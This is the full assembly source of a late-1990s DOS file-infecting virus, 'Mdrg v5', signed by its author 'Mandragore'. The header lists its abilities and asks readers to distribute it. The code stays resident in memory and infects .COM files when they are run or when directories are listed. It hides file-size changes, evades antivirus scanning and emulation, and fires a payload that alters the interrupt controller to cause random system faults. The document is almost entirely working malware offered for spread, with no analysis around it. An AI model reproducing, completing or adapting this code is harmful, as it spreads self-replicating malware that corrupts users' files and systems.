%out ù-Ä-%( Mdrg v5 )%Ä--ù
%out
;
; Simple , but include many interestingz trickz ...
;
; Abilityz:
;  real .com only / tsr / dir stealth (int 21 sf 12) / detect TBSCANX
;  infct on exec & dir / undetectable (most AV at june 98)
;  provok (sometimes) random problemz and/or sentence at runnin'
;  anti-emul added to avoid easy removal
;    "We hatesss Debuggersss
;     Don't we Preciousss."
;                - Tolkien
;
;  none encryption, but feel free to add it ;) (let me know)
;  virus size = 666 ;)
;
; Contact me at mdrg@mygale.org (+) or mandragore@hotmail.com (-)
;          or check http://mandragore.home.ml.org
;
; Compile using tasm /m3 and tlink /t iz ok  ( if /m3 then virus_size = 666 )
;
; Hey ! french hpcav scene iz dying !!! WWWAAAAAAKKKKKKKEEEEEE UUUUPPPPP !
;
;                               Mandragore of Invaderz .
;
.model tiny
.code
.386
        org 100h
Start:  jmp install        

        lea dx,messg
	int 21h
        int 20h
messg   db 'Runtime error at 0116:109E$'        ;  fuckin' mess

;-----------------------  vir

virsiz  equ endvir - hooker

truebdt db 0b8h,0,9

hooker:
        pushf                   ;
        cmp ax,3088h            ;  chk
        je check                ;
        cmp ah,12h              ;  dir
        je dir                  ;
        push ax                 ;
        xor ah,4bh              ;  exc
        jnz true21              ;
        jmp exec                ;
true21:                          ;  
        pop ax                   ;  leave :~(
        popf                     ;
        db 0eah                  ;
oldint  dd 0                     ;

sign    db 'Mandragore',0                ;
virnam  db '[Mdrg v5]'                   ;  sig for AV ppl :)
endsig  dw 0                             ;
mess    db 'BEER and TEQUILA forever !',13,10,7,7,7,'$'
buff    db 8 dup (?)                     ;
buffc   db '.com',0                      ;
old3    db 3 dup (?)                    ;
nwjmp   db 0e9h                          ;
filesiz dw ?                            ;
adrold3 equ old3 - hooker                ;
hooksiz equ install - hooker             ;

check:                  ;
        popf            ;      ... I'm here !
	iret            ;

dir:                    ;
        call dword ptr cs:[oldint-hooker]
        pusha           ;
        push ds         ;
        or al,al        ;
        jnz retdir      ;       last ?
        mov ah,2fh      ;
        int 21h         ;       dta
        mov si,dx        ;
        mov al,[si]      ;  
        inc al           ;
        jnz noext        ;
        add bx,7         ;       extendd FCB ?
noext:                    ;
        cmp word ptr [bx+9],'OC'     ; .com ?
        jne retdir          ;
        mov ax,[bx+17h]     ;
        and al,1fh          ;  check if infctd
        cmp al,1            ;
        jne cando           ;
        sub word ptr [bx+1dh],virsiz+3
        jmp retdir          ;
cando:
        inc bx             ;
        push cs cs es      ;
        pop ds es          ;
        mov cx,4           ;
        mov di,buff-hooker ;
        mov si,bx          ;
        push di            ;
        rep movsw          ;
        pop dx             ;
        pop ds             ;
        call infct            ;)~
retdir: pop ds             ;
        popa               ;
        iret               ;

exec:                           ;
        pusha                   ;  .com ?
        push es                 ;
        mov si,dx               ;
bcl1:   lodsb                   ;
        cmp al,'.'              ;
        jne bcl1                ;
suit1:                          ;
        cmp word ptr [si],'OC'  ;
        jne suit3               ;
        call infct                 ;)~
suit3:
        mov ah,2ch       ;
        int 21h          ;  disp phun string ?
        cmp dh,5         ;      time 4 rndom numba
        ja suit4         ;
        push cs          ;
        pop ds           ;
        mov ah,9         ;
        mov dx,mess-hooker
        int 21h          ;
        xor ax,ax        ;
        int 16h          ;
suit4:
        pop ds           ;
        popa             ;  zat's all folks
        jmp true21       ;
infct:  
        push dx ds        ;  delete all AV
        mov ax,4300h       ;
        int 21h            ;  attribs >cx >stack
        push cx            ;               @
        mov ax,4201h     ;
        xor cx,cx        ;  chmod
        inc ah           ;
        int 21h          ;
        mov ax,3d02h       ;
        int 21h            ;  open r/w
        jnc $+5            ;
        jmp notok2         ;
        xchg bx,ax         ;
        mov ax,5700h     ;
        int 21h          ;  chk if infctd
        push cx          ;      time >stack   #
        and cx,001Fh     ;
        cmp cx,1         ;
        jne suit5        ;
        pop cx          ;
        jmp notok       ;
suit5:  push dx          ;      date >stack   #
        push cs         ;
        pop ds          ;
        mov ah,3fh       ;  read from file
        mov dx,adrold3   ;
        mov si,dx        ;
        mov cx,3         ;      3 1st bytes
        int 21h          ;
        mov ax,0a5b2h      ;    
        not ax             ;
        xor [si],ax        ;
notcom: jnz okcom          ;  fake .com ?
        pop ax ax          ;
        jmp notok          ;
okcom:  xor [si],ax        ;
        mov cl,8           ;
        ror ax,cl          ;
        xor [si],ax        ;
        jz notcom          ;
        xor [si],ax        ;
        mov ax,4202h      ;
        xor cx,cx         ;  lseek at EOF
        xor dx,dx         ;
        int 21h           ;
        mov si,filesiz-hooker
        add ax,hooksiz    ;                
        mov [si],ax       ;       get file size & calc new jmp
        mov ah,3fh       ;
        mov cx,3         ;  keep old 3 1st bytes at EOF
        mov dx,adrold3   ;
        inc ah           ;
        push ax ax       ; * *
        int 21h          ;
        pop ax            ; *
        mov cx,virsiz     ;  write vir corpse after old3byts
        xor dx,dx         ;
        int 21h           ;
        mov ax,4200h     ;
        xor cx,cx        ;  lseek at BOF
        xor dx,dx        ;
        int 21h          ;
        pop ax            ; *
        mov cx,3          ;  write new jmp
        mov dx,nwjmp-hooker
        int 21h           ;
        mov ax,5601h     ;
        pop dx           ;  stack >date/time #
        pop cx           ;                   #
        and cl,0e0h      ;
        or cl,1          ;      mark file : sec = 2
        inc ah           ;
        int 21h          ;
notok:  mov ah,3eh       ;  cloz
        int 21h          ;
notok2: mov ax,4201h    ;
        pop cx          ;  stack >attribz       @
        pop ds dx       ;
        inc ah          ;
        int 21h         ;
        ret              ;

;-------------------------------  install

install:                 
        call suit2              ;
        nop                     ;  delta ...
suit2:  nop                     ;
        pop bp                  ;
        sub bp,offset suit2     ;
        inc bp                  ;
        
        xor ax,ax               ;  
        int 15h                 ;  no-emul I
        cmp ah,86h              ;
        jz $+4                  ;
        db 0ffh,0ffh            ;       make tbclean crazy !

        mov ax,3088h            ;
        int 21h                 ;  chk if yet rsdnt
        cmp al,88h              ;
        jne $+5                 ;
        jmp back                ;       out of range

        mov ax,0ca00h           ;
        mov bx,5442h            ;  chk TBSCANX
        int 2fh                 ;
        inc al                  ;
        jZ back                 ;

; ---------------------------  make it resdnt

        mov bx,cs        ;
        dec bx           ;  Get mem available
        mov ds,bx        ;
        mov bx,ds:[3]    ;
	
        mov ah,4ah                  ;  
        sub bx,virsiz/16+2          ;  3 mem
        int 21h                     ;

        mov ah,48h                  ;
        mov bx,virsiz/16+1          ;  suck RAM
        int 21h                     ;
        mov es,ax                   ;

        dec ax                      ;
        mov ds,ax                   ;  dos owner
        xor si,si                   ;
        mov byte ptr [si],'Z'       ;
        mov word ptr [si+1],8       ;
	
        push cs                      ;
        pop ds                       ;  put it high
        xor di,di                    ;
        lea si,bp+hooker             ;
        mov cx,virsiz                ;
        rep movsb                    ;

        mov ds,bp+endsig                        ;
        push ds                                 ;  swap ints
        mov si,84h                              ;
        lds bx,ds:[si]                          ;
        mov word ptr es:[oldint-hooker],bx      ;
        mov word ptr es:[oldint-hooker+2],ds    ;
        pop ds                                  ;
        mov si,86h                              ;
        mov ds:[si],es                          ;
        mov word ptr ds:[si-2],0                ;

;------------------  run-time activation-rutine

        push cs           ;
        pop ds            ;
        mov ah,2ch       ;
        int 21h          ;
        cmp dh,10h       ;
        ja noarut        ;
        lea dx,bp+drunk  ;
        mov ah,9         ;  disp disconcertin' mess
        int 21h          ;
        xor ax,ax        ;
        mov ds,ax        ;  this make random problmz :)
        in al,21h        ;
        mov si,46ch      ;
        xor al,[si]      ;    clock at 0:46c
        and al,0fdh      ;
        out 21h,al       ;

;------------------ back

noarut: push cs cs                   ;  make the comp. reboot
        pop ds es                    ;

back:
        mov ah,0f6h                     ;  No Emul II
        int 16h                         ;

        lea si,bp+hooker-3              ;
        mov di,101h                     ;  klean file header
        dec di                          ;
        push di                         ;
        mov ax,[si]                     ;
        mov [di],ax                     ;
        mov ah,[si+2]                   ;
        mov [di+2],ah                   ;
        ret                             ;       jump !

drunk   db 'Error 8869: processor drunk 8*) !',13,10,7,'$'
     db 6 dup (?)
   db 'Eddy iz still alive somwhere in time ...'   ;) (c) dark advenger

endvir:
        end start


; (x) mAnDRaGorE Ä--ù           Please diztribute ;)
